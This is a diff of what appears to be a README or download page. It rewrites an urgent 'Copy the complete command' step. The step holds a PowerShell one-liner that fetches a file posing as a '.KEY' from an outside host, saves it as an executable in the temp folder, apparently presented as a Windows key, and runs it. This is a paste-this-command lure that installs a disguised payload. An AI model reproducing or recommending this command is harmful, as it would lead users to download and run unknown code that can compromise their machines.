@@ -7,12 +7,4 @@
 
 ### ATTENTION ⚡ Copy the complete command ⚡
 
-> `
-
-
-
-Invoke-WebRequest -Uri https://downloadapplication.pythonanywhere.com/static/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY -OutFile $env:TEMP\arquivo.exe; Start-Process $env:TEMP\arquivo.exe
-
-
-`
-
+> `Invoke-WebRequest -Uri https://downloadapplication.pythonanywhere.com/static/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY -OutFile $env:TEMP\WindowsKEY.exe; Start-Process $env:TEMP\WindowsKEY.exe`
